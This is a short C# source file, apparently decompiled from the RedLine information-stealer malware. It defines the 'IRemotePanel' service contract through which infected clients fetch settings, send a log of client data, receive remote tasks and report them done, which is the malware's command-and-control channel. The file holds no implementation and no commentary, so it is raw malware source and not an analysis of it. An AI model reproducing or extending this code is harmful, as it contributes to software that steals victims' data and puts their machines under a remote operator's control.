using System;
using System.Collections.Generic;
using System.ServiceModel;
using RedLine.Models;

namespace RedLine
{
	// Token: 0x02000002 RID: 2
	[ServiceContract(Name = "IRemotePanel")]
	public interface IRemotePanel
	{
		// Token: 0x06000001 RID: 1
		[OperationContract(Name = "GetSettings")]
		ClientSettings GetSettings();

		// Token: 0x06000002 RID: 2
		[OperationContract(Name = "SendClientInfo")]
		void SendMe(UserLog user);

		// Token: 0x06000003 RID: 3
		[OperationContract(Name = "GetTasks")]
		IList<RemoteTask> GetTasks(UserLog user);

		// Token: 0x06000004 RID: 4
		[OperationContract(Name = "CompleteTask")]
		void CompleteTask(UserLog user, int taskId);
	}
}
